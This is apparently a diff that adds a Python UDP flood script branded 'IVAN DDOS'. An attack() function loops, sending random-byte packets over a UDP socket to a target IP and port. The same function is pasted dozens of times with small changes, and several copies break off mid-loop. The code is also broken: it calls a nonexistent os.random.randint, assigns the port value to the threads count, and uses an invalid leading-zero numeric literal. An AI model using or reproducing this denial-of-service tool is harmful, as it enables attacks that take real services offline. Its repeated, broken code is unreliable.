+def attack(ip, port, time, threads):
+
+    if time is None:
+        time = float('inf')
+
+    if port is not None:
+        port = max(1, min(999999999, port))
+    if threads is not None:
+        threads = max(1, min(999999999, port))
+    print(brand)
+    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
+    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
+        ip=ip,
+        port='port {port}'.format(port=port) if port else 'random ports'
+    )
+    print(fmt)
+
+    startup = tt()
+    threads = os.urandom(min(6161, threads))
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    
+    while True:
+        port = port or os.random.randint(1, 999999999)
+        threads = threads or os.random.randint(1, 999999999)
+        time = time or os.random.randint(1, 999999999)
+
+        endtime = tt()
+        if (startup + time) < endtime:
+            break
+
+        sock.sendto(threads, (ip, port))
+
+    print('\033[91m Tamat')
+    os.system("clear")
+    
+def attack(ip, port, time, threads):
+
+    if time is None:
+        time = float('inf')
+
+    if port is not None:
+        port = max(1, min(999999999, port))
+    if threads is not None:
+        threads = max(1, min(999999999, port))
+    print(brand)
+    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
+    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
+        ip=ip,
+        port='port {port}'.format(port=port) if port else 'random ports'
+    )
+    print(fmt)
+
+    startup = tt()
+    threads = os.urandom(min(6161, threads))
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    
+    while True:
+        port = port or os.random.randint(1, 999999999)
+        threads = threads or os.random.randint(1, 999999999)
+        time = time or os.random.randint(1, 999999999)
+
+        endtime = tt()
+        if (startup + time) < endtime:
+            break
+
+        sock.sendto(threads, (ip, port))
+
+    print('\033[91m Tamat')
+    os.system("clear")
+   
+def attack(ip, port, time, threads):
+
+    if time is None:
+        time = float('inf')
+
+    if port is not None:
+        port = max(1, min(999999999, port))
+    if threads is not None:
+        threads = max(1, min(999999999, port))
+    print(brand)
+    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
+    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
+        ip=ip,
+        port='port {port}'.format(port=port) if port else 'random ports'
+    )
+    print(fmt)
+
+    startup = tt()
+    threads = os.urandom(min(6161, threads))
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    
+    while True:
+        port = port or os.random.randint(1, 999999999)
+        threads = threads or os.random.randint(1, 999999999)
+        time = time or os.random.randint(1, 999999999)
+
+        endtime = tt()
+        if (startup + time) < endtime:
+            break
+
+        sock.sendto(threads, (ip, port))
+
+    print('\033[91m Tamat')
+    os.system("clear")
+ 
+def attack(ip, port, time, threads):
+
+    if time is None:
+        time = float('inf')
+
+    if port is not None:
+        port = max(1, min(999999999, port))
+    if threads is not None:
+        threads = max(1, min(999999999, port))
+    print(brand)
+    print("\033[92m ---->>>> SENT PACKET IVAN DDOS ★★★★")
+    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
+        ip=ip,
+        port='port {port}'.format(port=port) if port else 'random ports'
+    )
+    print(fmt)
+
+    startup = tt()
+    threads = os.urandom(min(6161, threads))
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    
+    while True:
+        port = port or os.random.randint(1, 999999999)
+        threads = threads or os.random.randint(1, 999999999)
+        time = time or os.random.randint(1, 999999999)
+
+        endtime = tt()
+        if (startup + time) < endtime:
+            break
+
+        sock.sendto(threads, (ip, port))
+
+    print('\033[91m Tamat')
+    os.system("clear")
+    
+def attack(ip, port, time, threads):
+
+    if time is None:
+        time = float('inf')
+
+    if port is not None:
+        port = max(1, min(999999999, port))
+    if threads is not None:
+        threads = max(1, min(999999999, port))
+    print(brand)
+    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
+    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
+        ip=ip,
+        port='port {port}'.format(port=port) if port else 'random ports'
+    )
+    print(fmt)
+
+    startup = tt()
+    threads = os.urandom(min(6161, threads))
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    
+    while True:
+        port = port or os.random.randint(1, 999999999)
+        threads = threads or os.random.randint(1, 999999999)
+        time = time or os.random.randint(1, 999999999)
+
+        endtime = tt()
+        if (startup + time) < endtime:
+            break
+
+        sock.sendto(threads, (ip, port))
+
+    print('\033[91m Tamat')
+    os.system("clear")
+ 
+def attack(ip, port, time, threads):
+
+    if time is None:
+        time = float('inf')
+
+    if port is not None:
+        port = max(1, min(999999999, port))
+    if threads is not None:
+        threads = max(1, min(999999999, port))
+    print(brand)
+    print("\033[92m ---->>>> SENT PACKET IVAN DDOS ★★★★")
+    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
+        ip=ip,
+        port='port {port}'.format(port=port) if port else 'random ports'
+    )
+    print(fmt)
+
+    startup = tt()
+    threads = os.urandom(min(6161, threads))
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    
+    while True:
+        port = port or os.random.randint(1, 999999999)
+        threads = threads or os.random.randint(1, 999999999)
+        time = time or os.random.randint(1, 999999999)
+
+        endtime = tt()
+        if (startup + time) < endtime:
+            break
+
+        sock.sendto(threads, (ip, port))
+
+    print('\033[91m Tamat')
+    os.system("clear")
+    
+def attack(ip, port, time, threads):
+
+    if time is None:
+        time = float('inf')
+
+    if port is not None:
+        port = max(1, min(999999999, port))
+    if threads is not None:
+        threads = max(1, min(999999999, port))
+    print(brand)
+    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
+    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
+        ip=ip,
+        port='port {port}'.format(port=port) if port else 'random ports'
+    )
+    print(fmt)
+
+    startup = tt()
+    threads = os.urandom(min(00000000099999999956789000000000999999999, threads))
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    
+    while True:
+        port = port or os.random.randint(1, 999999999)
+        threads = threads or os.random.randint(1, 999999999)
+        time = time or os.random.randint(1, 999999999)
+    
+        endtime = tt()
+        if (startup + time) < endtime:
+            break
+
+        sock.sendto(threads, (ip, port))
+    
+def attack(ip, port, time, threads):
+
+    if time is None:
+        time = float('inf')
+
+    if port is not None:
+        port = max(1, min(999999999, port))
+    if threads is not None:
+        threads = max(1, min(999999999, port))
+    print(brand)
+    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
+    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
+        ip=ip,
+        port='port {port}'.format(port=port) if port else 'random ports'
+    )
+    print(fmt)
+
+    startup = tt()
+    threads = os.urandom(min(00000000099999999956789000000000999999999, threads))
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    
+    while True:
+        port = port or os.random.randint(1, 999999999)
+        threads = threads or os.random.randint(1, 999999999)
+        time = time or os.random.randint(1, 999999999)
+        
+        endtime = tt()
+        if (startup + time) < endtime:
+            break
+
+        sock.sendto(threads, (ip, port))
+        
+def attack(ip, port, time, threads):
+
+    if time is None:
+        time = float('inf')
+
+    if port is not None:
+        port = max(1, min(999999999, port))
+    if threads is not None:
+        threads = max(1, min(999999999, port))
+    print(brand)
+    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
+    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
+        ip=ip,
+        port='port {port}'.format(port=port) if port else 'random ports'
+    )
+    print(fmt)
+
+    startup = tt()
+    threads = os.urandom(min(00000000099999999956789000000000999999999, threads))
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    
+    while True:
+        port = port or os.random.randint(1, 999999999)
+        threads = threads or os.random.randint(1, 999999999)
+        time = time or os.random.randint(1, 999999999)
+        
+        endtime = tt()
+        if (startup + time) < endtime:
+            break
+
+        sock.sendto(threads, (ip, port))
+        
+def attack(ip, port, time, threads):
+
+    if time is None:
+        time = float('inf')
+
+    if port is not None:
+        port = max(1, min(999999999, port))
+    if threads is not None:
+        threads = max(1, min(999999999, port))
+    print(brand)
+    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
+    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
+        ip=ip,
+        port='port {port}'.format(port=port) if port else 'random ports'
+    )
+    print(fmt)
+
+    startup = tt()
+    threads = os.urandom(min(00000000099999999956789000000000999999999, threads))
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    
+    while True:
+        port = port or os.random.randint(1, 999999999)
+        threads = threads or os.random.randint(1, 999999999)
+        time = time or os.random.randint(1, 999999999)
+        
+        endtime = tt()
+        if (startup + time) < endtime:
+            break
+
+        sock.sendto(threads, (ip, port))
+        
+def attack(ip, port, time, threads):
+
+    if time is None:
+        time = float('inf')
+
+    if port is not None:
+        port = max(1, min(999999999, port))
+    if threads is not None:
+        threads = max(1, min(999999999, port))
+    print(brand)
+    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
+    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
+        ip=ip,
+        port='port {port}'.format(port=port) if port else 'random ports'
+    )
+    print(fmt)
+
+    startup = tt()
+    threads = os.urandom(min(00000000099999999956789000000000999999999, threads))
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    
+    while True:
+        port = port or os.random.randint(1, 999999999)
+        threads = threads or os.random.randint(1, 999999999)
+        time = time or os.random.randint(1, 999999999)
+        
+def attack(ip, port, time, threads):
+
+    if time is None:
+        time = float('inf')
+
+    if port is not None:
+        port = max(1, min(999999999, port))
+    if threads is not None:
+        threads = max(1, min(999999999, port))
+    print(brand)
+    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
+    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
+        ip=ip,
+        port='port {port}'.format(port=port) if port else 'random ports'
+    )
+    print(fmt)
+
+    startup = tt()
+    threads = os.urandom(min(00000000099999999956789000000000999999999, threads))
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    
+    while True:
+        port = port or os.random.randint(1, 999999999)
+        threads = threads or os.random.randint(1, 999999999)
+        time = time or os.random.randint(1, 999999999)
+    
+        endtime = tt()
+        if (startup + time) < endtime:
+            break
+
+        sock.sendto(threads, (ip, port))
+    
+def attack(ip, port, time, threads):
+
+    if time is None:
+        time = float('inf')
+
+    if port is not None:
+        port = max(1, min(999999999, port))
+    if threads is not None:
+        threads = max(1, min(999999999, port))
+    print(brand)
+    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
+    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
+        ip=ip,
+        port='port {port}'.format(port=port) if port else 'random ports'
+    )
+    print(fmt)
+
+    startup = tt()
+    threads = os.urandom(min(00000000099999999956789000000000999999999, threads))
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    
+    while True:
+        port = port or os.random.randint(1, 999999999)
+        threads = threads or os.random.randint(1, 999999999)
+        time = time or os.random.randint(1, 999999999)
+        
+        endtime = tt()
+        if (startup + time) < endtime:
+            break
+
+        sock.sendto(threads, (ip, port))
+        
+def attack(ip, port, time, threads):
+
+    if time is None:
+        time = float('inf')
+
+    if port is not None:
+        port = max(1, min(999999999, port))
+    if threads is not None:
+        threads = max(1, min(999999999, port))
+    print(brand)
+    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
+    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
+        ip=ip,
+        port='port {port}'.format(port=port) if port else 'random ports'
+    )
+    print(fmt)
+
+    startup = tt()
+    threads = os.urandom(min(00000000099999999956789000000000999999999, threads))
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    
+    while True:
+        port = port or os.random.randint(1, 999999999)
+        threads = threads or os.random.randint(1, 999999999)
+        time = time or os.random.randint(1, 999999999)
+        
+        endtime = tt()
+        if (startup + time) < endtime:
+            break
+
+        sock.sendto(threads, (ip, port))
+        
+def attack(ip, port, time, threads):
+
+    if time is None:
+        time = float('inf')
+
+    if port is not None:
+        port = max(1, min(999999999, port))
+    if threads is not None:
+        threads = max(1, min(999999999, port))
+    print(brand)
+    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
+    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
+        ip=ip,
+        port='port {port}'.format(port=port) if port else 'random ports'
+    )
+    print(fmt)
+
+    startup = tt()
+    threads = os.urandom(min(00000000099999999956789000000000999999999, threads))
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    
+    while True:
+        port = port or os.random.randint(1, 999999999)
+        threads = threads or os.random.randint(1, 999999999)
+        time = time or os.random.randint(1, 999999999)
+        
+        endtime = tt()
+        if (startup + time) < endtime:
+            break
+
+        sock.sendto(threads, (ip, port))
+        
+def attack(ip, port, time, threads):
+
+    if time is None:
+        time = float('inf')
+
+    if port is not None:
+        port = max(1, min(999999999, port))
+    if threads is not None:
+        threads = max(1, min(999999999, port))
+    print(brand)
+    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
+    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
+        ip=ip,
+        port='port {port}'.format(port=port) if port else 'random ports'
+    )
+    print(fmt)
+
+    startup = tt()
+    threads = os.urandom(min(00000000099999999956789000000000999999999, threads))
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    
+    while True:
+        port = port or os.random.randint(1, 999999999)
+        threads = threads or os.random.randint(1, 999999999)
+        time = time or os.random.randint(1, 999999999)
+        
+def attack(ip, port, time, threads):
+
+    if time is None:
+        time = float('inf')
+
+    if port is not None:
+        port = max(1, min(999999999, port))
+    if threads is not None:
+        threads = max(1, min(999999999, port))
+    print(brand)
+    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
+    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
+        ip=ip,
+        port='port {port}'.format(port=port) if port else 'random ports'
+    )
+    print(fmt)
+
+    startup = tt()
+    threads = os.urandom(min(6161, threads))
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    
+    while True:
+        port = port or os.random.randint(1, 999999999)
+        threads = threads or os.random.randint(1, 999999999)
+        time = time or os.random.randint(1, 999999999)
+
+        endtime = tt()
+        if (startup + time) < endtime:
+            break
+
+        sock.sendto(threads, (ip, port))
+
+    print('\033[91m Tamat')
+    os.system("clear")
+    
+def attack(ip, port, time, threads):
+
+    if time is None:
+        time = float('inf')
+
+    if port is not None:
+        port = max(1, min(999999999, port))
+    if threads is not None:
+        threads = max(1, min(999999999, port))
+    print(brand)
+    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
+    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
+        ip=ip,
+        port='port {port}'.format(port=port) if port else 'random ports'
+    )
+    print(fmt)
+
+    startup = tt()
+    threads = os.urandom(min(6161, threads))
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    
+    while True:
+        port = port or os.random.randint(1, 999999999)
+        threads = threads or os.random.randint(1, 999999999)
+        time = time or os.random.randint(1, 999999999)
+
+        endtime = tt()
+        if (startup + time) < endtime:
+            break
+
+        sock.sendto(threads, (ip, port))
+
+    print('\033[91m Tamat')
+    os.system("clear")
+   
+def attack(ip, port, time, threads):
+
+    if time is None:
+        time = float('inf')
+
+    if port is not None:
+        port = max(1, min(999999999, port))
+    if threads is not None:
+        threads = max(1, min(999999999, port))
+    print(brand)
+    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
+    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
+        ip=ip,
+        port='port {port}'.format(port=port) if port else 'random ports'
+    )
+    print(fmt)
+
+    startup = tt()
+    threads = os.urandom(min(6161, threads))
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    
+    while True:
+        port = port or os.random.randint(1, 999999999)
+        threads = threads or os.random.randint(1, 999999999)
+        time = time or os.random.randint(1, 999999999)
+
+        endtime = tt()
+        if (startup + time) < endtime:
+            break
+
+        sock.sendto(threads, (ip, port))
+
+    print('\033[91m Tamat')
+    os.system("clear")
+ 
+def attack(ip, port, time, threads):
+
+    if time is None:
+        time = float('inf')
+
+    if port is not None:
+        port = max(1, min(999999999, port))
+    if threads is not None:
+        threads = max(1, min(999999999, port))
+    print(brand)
+    print("\033[92m ---->>>> SENT PACKET IVAN DDOS ★★★★")
+    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
+        ip=ip,
+        port='port {port}'.format(port=port) if port else 'random ports'
+    )
+    print(fmt)
+
+    startup = tt()
+    threads = os.urandom(min(6161, threads))
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    
+    while True:
+        port = port or os.random.randint(1, 999999999)
+        threads = threads or os.random.randint(1, 999999999)
+        time = time or os.random.randint(1, 999999999)
+
+        endtime = tt()
+        if (startup + time) < endtime:
+            break
+
+        sock.sendto(threads, (ip, port))
+
+    print('\033[91m Tamat')
+    os.system("clear")
+    
+def attack(ip, port, time, threads):
+
+    if time is None:
+        time = float('inf')
+
+    if port is not None:
+        port = max(1, min(999999999, port))
+    if threads is not None:
+        threads = max(1, min(999999999, port))
+    print(brand)
+    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
+    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
+        ip=ip,
+        port='port {port}'.format(port=port) if port else 'random ports'
+    )
+    print(fmt)
+
+    startup = tt()
+    threads = os.urandom(min(6161, threads))
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    
+    while True:
+        port = port or os.random.randint(1, 999999999)
+        threads = threads or os.random.randint(1, 999999999)
+        time = time or os.random.randint(1, 999999999)
+
+        endtime = tt()
+        if (startup + time) < endtime:
+            break
+
+        sock.sendto(threads, (ip, port))
+
+    print('\033[91m Tamat')
+    os.system("clear")
+    
+def attack(ip, port, time, threads):
+
+    if time is None:
+        time = float('inf')
+
+    if port is not None:
+        port = max(1, min(999999999, port))
+    if threads is not None:
+        threads = max(1, min(999999999, port))
+    print(brand)
+    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
+    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
+        ip=ip,
+        port='port {port}'.format(port=port) if port else 'random ports'
+    )
+    print(fmt)
+
+    startup = tt()
+    threads = os.urandom(min(6161, threads))
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    
+    while True:
+        port = port or os.random.randint(1, 999999999)
+        threads = threads or os.random.randint(1, 999999999)
+        time = time or os.random.randint(1, 999999999)
+
+        endtime = tt()
+        if (startup + time) < endtime:
+            break
+
+        sock.sendto(threads, (ip, port))
+
+    print('\033[91m Tamat')
+    os.system("clear")
+   
+def attack(ip, port, time, threads):
+
+    if time is None:
+        time = float('inf')
+
+    if port is not None:
+        port = max(1, min(999999999, port))
+    if threads is not None:
+        threads = max(1, min(999999999, port))
+    print(brand)
+    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
+    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
+        ip=ip,
+        port='port {port}'.format(port=port) if port else 'random ports'
+    )
+    print(fmt)
+
+    startup = tt()
+    threads = os.urandom(min(6161, threads))
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    
+    while True:
+        port = port or os.random.randint(1, 999999999)
+        threads = threads or os.random.randint(1, 999999999)
+        time = time or os.random.randint(1, 999999999)
+
+        endtime = tt()
+        if (startup + time) < endtime:
+            break
+
+        sock.sendto(threads, (ip, port))
+
+    print('\033[91m Tamat')
+    os.system("clear")
+ 
+def attack(ip, port, time, threads):
+
+    if time is None:
+        time = float('inf')
+
+    if port is not None:
+        port = max(1, min(999999999, port))
+    if threads is not None:
+        threads = max(1, min(999999999, port))
+    print(brand)
+    print("\033[92m ---->>>> SENT PACKET IVAN DDOS ★★★★")
+    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
+        ip=ip,
+        port='port {port}'.format(port=port) if port else 'random ports'
+    )
+    print(fmt)
+
+    startup = tt()
+    threads = os.urandom(min(6161, threads))
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    
+    while True:
+        port = port or os.random.randint(1, 999999999)
+        threads = threads or os.random.randint(1, 999999999)
+        time = time or os.random.randint(1, 999999999)
+
+        endtime = tt()
+        if (startup + time) < endtime:
+            break
+
+        sock.sendto(threads, (ip, port))
+
+    print('\033[91m Tamat')
+    os.system("clear")
+    
+def attack(ip, port, time, threads):
+
+    if time is None:
+        time = float('inf')
+
+    if port is not None:
+        port = max(1, min(999999999, port))
+    if threads is not None:
+        threads = max(1, min(999999999, port))
+    print(brand)
+    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
+    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
+        ip=ip,
+        port='port {port}'.format(port=port) if port else 'random ports'
+    )
+    print(fmt)
+
+    startup = tt()
+    threads = os.urandom(min(6161, threads))
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    
+    while True:
+        port = port or os.random.randint(1, 999999999)
+        threads = threads or os.random.randint(1, 999999999)
+        time = time or os.random.randint(1, 999999999)
+
+        endtime = tt()
+        if (startup + time) < endtime:
+            break
+
+        sock.sendto(threads, (ip, port))
+
+    print('\033[91m Tamat')
+    os.system("clear")
+ 
+def attack(ip, port, time, threads):
+
+    if time is None:
+        time = float('inf')
+
+    if port is not None:
+        port = max(1, min(999999999, port))
+    if threads is not None:
+        threads = max(1, min(999999999, port))
+    print(brand)
+    print("\033[92m ---->>>> SENT PACKET IVAN DDOS ★★★★")
+    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
+        ip=ip,
+        port='port {port}'.format(port=port) if port else 'random ports'
+    )
+    print(fmt)
+
+    startup = tt()
+    threads = os.urandom(min(6161, threads))
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    
+    while True:
+        port = port or os.random.randint(1, 999999999)
+        threads = threads or os.random.randint(1, 999999999)
+        time = time or os.random.randint(1, 999999999)
+
+        endtime = tt()
+        if (startup + time) < endtime:
+            break
+
+        sock.sendto(threads, (ip, port))
+
+    print('\033[91m Tamat')
+    os.system("clear")
+    
+def attack(ip, port, time, threads):
+
+    if time is None:
+        time = float('inf')
+
+    if port is not None:
+        port = max(1, min(999999999, port))
+    if threads is not None:
+        threads = max(1, min(999999999, port))
+    print(brand)
+    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
+    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
+        ip=ip,
+        port='port {port}'.format(port=port) if port else 'random ports'
+    )
+    print(fmt)
+
+    startup = tt()
+    threads = os.urandom(min(00000000099999999956789000000000999999999, threads))
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    
+    while True:
+        port = port or os.random.randint(1, 999999999)
+        threads = threads or os.random.randint(1, 999999999)
+        time = time or os.random.randint(1, 999999999)
+    
+        endtime = tt()
+        if (startup + time) < endtime:
+            break
+
+        sock.sendto(threads, (ip, port))
+    
+def attack(ip, port, time, threads):
+
+    if time is None:
+        time = float('inf')
+
+    if port is not None:
+        port = max(1, min(999999999, port))
+    if threads is not None:
+        threads = max(1, min(999999999, port))
+    print(brand)
+    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
+    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
+        ip=ip,
+        port='port {port}'.format(port=port) if port else 'random ports'
+    )
+    print(fmt)
+
+    startup = tt()
+    threads = os.urandom(min(00000000099999999956789000000000999999999, threads))
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    
+    while True:
+        port = port or os.random.randint(1, 999999999)
+        threads = threads or os.random.randint(1, 999999999)
+        time = time or os.random.randint(1, 999999999)
+        
+        endtime = tt()
+        if (startup + time) < endtime:
+            break
+
+        sock.sendto(threads, (ip, port))
+        
+def attack(ip, port, time, threads):
+
+    if time is None:
+        time = float('inf')
+
+    if port is not None:
+        port = max(1, min(999999999, port))
+    if threads is not None:
+        threads = max(1, min(999999999, port))
+    print(brand)
+    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
+    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
+        ip=ip,
+        port='port {port}'.format(port=port) if port else 'random ports'
+    )
+    print(fmt)
+
+    startup = tt()
+    threads = os.urandom(min(00000000099999999956789000000000999999999, threads))
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    
+    while True:
+        port = port or os.random.randint(1, 999999999)
+        threads = threads or os.random.randint(1, 999999999)
+        time = time or os.random.randint(1, 999999999)
+        
+        endtime = tt()
+        if (startup + time) < endtime:
+            break
+
+        sock.sendto(threads, (ip, port))
+        
+def attack(ip, port, time, threads):
+
+    if time is None:
+        time = float('inf')
+
+    if port is not None:
+        port = max(1, min(999999999, port))
+    if threads is not None:
+        threads = max(1, min(999999999, port))
+    print(brand)
+    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
+    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
+        ip=ip,
+        port='port {port}'.format(port=port) if port else 'random ports'
+    )
+    print(fmt)
+
+    startup = tt()
+    threads = os.urandom(min(00000000099999999956789000000000999999999, threads))
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    
+    while True:
+        port = port or os.random.randint(1, 999999999)
+        threads = threads or os.random.randint(1, 999999999)
+        time = time or os.random.randint(1, 999999999)
+        
+        endtime = tt()
+        if (startup + time) < endtime:
+            break
+
+        sock.sendto(threads, (ip, port))
+        
+def attack(ip, port, time, threads):
+
+    if time is None:
+        time = float('inf')
+
+    if port is not None:
+        port = max(1, min(999999999, port))
+    if threads is not None:
+        threads = max(1, min(999999999, port))
+    print(brand)
+    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
+    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
+        ip=ip,
+        port='port {port}'.format(port=port) if port else 'random ports'
+    )
+    print(fmt)
+
+    startup = tt()
+    threads = os.urandom(min(00000000099999999956789000000000999999999, threads))
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    
+    while True:
+        port = port or os.random.randint(1, 999999999)
+        threads = threads or os.random.randint(1, 999999999)
+        time = time or os.random.randint(1, 999999999)
+        
+def attack(ip, port, time, threads):
+
+    if time is None:
+        time = float('inf')
+
+    if port is not None:
+        port = max(1, min(999999999, port))
+    if threads is not None:
+        threads = max(1, min(999999999, port))
+    print(brand)
+    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
+    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
+        ip=ip,
+        port='port {port}'.format(port=port) if port else 'random ports'
+    )
+    print(fmt)
+
+    startup = tt()
+    threads = os.urandom(min(00000000099999999956789000000000999999999, threads))
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    
+    while True:
+        port = port or os.random.randint(1, 999999999)
+        threads = threads or os.random.randint(1, 999999999)
+        time = time or os.random.randint(1, 999999999)
+    
+        endtime = tt()
+        if (startup + time) < endtime:
+            break
+
+        sock.sendto(threads, (ip, port))
+    
+def attack(ip, port, time, threads):
+
+    if time is None:
+        time = float('inf')
+
+    if port is not None:
+        port = max(1, min(999999999, port))
+    if threads is not None:
+        threads = max(1, min(999999999, port))
+    print(brand)
+    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
+    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
+        ip=ip,
+        port='port {port}'.format(port=port) if port else 'random ports'
+    )
+    print(fmt)
+
+    startup = tt()
+    threads = os.urandom(min(00000000099999999956789000000000999999999, threads))
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    
+    while True:
+        port = port or os.random.randint(1, 999999999)
+        threads = threads or os.random.randint(1, 999999999)
+        time = time or os.random.randint(1, 999999999)
+        
+        endtime = tt()
+        if (startup + time) < endtime:
+            break
+
+        sock.sendto(threads, (ip, port))
+        
+def attack(ip, port, time, threads):
+
+    if time is None:
+        time = float('inf')
+
+    if port is not None:
+        port = max(1, min(999999999, port))
+    if threads is not None:
+        threads = max(1, min(999999999, port))
+    print(brand)
+    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
+    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
+        ip=ip,
+        port='port {port}'.format(port=port) if port else 'random ports'
+    )
+    print(fmt)
+
+    startup = tt()
+    threads = os.urandom(min(00000000099999999956789000000000999999999, threads))
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    
+    while True:
+        port = port or os.random.randint(1, 999999999)
+        threads = threads or os.random.randint(1, 999999999)
+        time = time or os.random.randint(1, 999999999)
+        
+        endtime = tt()
+        if (startup + time) < endtime:
+            break
+
+        sock.sendto(threads, (ip, port))
+        
+def attack(ip, port, time, threads):
+
+    if time is None:
+        time = float('inf')
+
+    if port is not None:
+        port = max(1, min(999999999, port))
+    if threads is not None:
+        threads = max(1, min(999999999, port))
+    print(brand)
+    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
